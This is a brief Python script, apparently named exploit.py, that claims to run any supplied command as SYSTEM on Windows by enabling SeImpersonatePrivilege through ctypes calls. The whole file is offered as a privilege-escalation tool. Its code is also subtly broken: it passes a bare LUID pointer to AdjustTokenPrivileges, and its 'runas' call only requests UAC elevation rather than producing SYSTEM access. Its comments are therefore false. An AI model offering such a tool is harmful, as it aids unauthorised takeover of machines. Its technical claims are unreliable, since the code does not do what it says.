import os
import sys
import ctypes

def enable_privilege(privilege_name):
    """Enable the specified privilege."""
    h_token = ctypes.c_void_p()
    ctypes.windll.kernel32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 0x0020, ctypes.byref(h_token))

    luid = ctypes.c_void_p()
    ctypes.windll.advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid))

    tkp = ctypes.c_void_p()
    ctypes.windll.advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(luid), 0, None, None)

def run_command(command):
    """Run a command as SYSTEM."""
    # Create a new process with SYSTEM privileges
    command_line = f"cmd.exe /c {command}"
    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", command_line, None, 1)

def main(command):
    # Enable the SeImpersonatePrivilege
    enable_privilege("SeImpersonatePrivilege")

    # Execute the command as SYSTEM
    run_command(command)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit.py '<command>'")
        sys.exit(1)

    main(sys.argv[1])
